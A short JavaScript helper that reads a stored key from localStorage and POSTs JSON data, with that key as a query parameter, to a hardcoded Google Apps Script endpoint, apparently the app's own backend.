export default async function postData(data = {}) {
    const key = (`; ${localStorage.getItem('Key')}`).split(`; `).pop().split(';')[0];

    await fetch(`https://script.google.com/macros/s/AKfycbxUWFF0-Ntn5aDlDJ9WXyeRJbjocQFEaTcA6klDPBKMcC_taWtrAyaD4XhQ7ypazAG_PQ/exec?cookie=${key}`, {
        method: "POST",
        headers: {
            "Content-Type": "text/plain",
        },
        body: JSON.stringify(data)
    });
}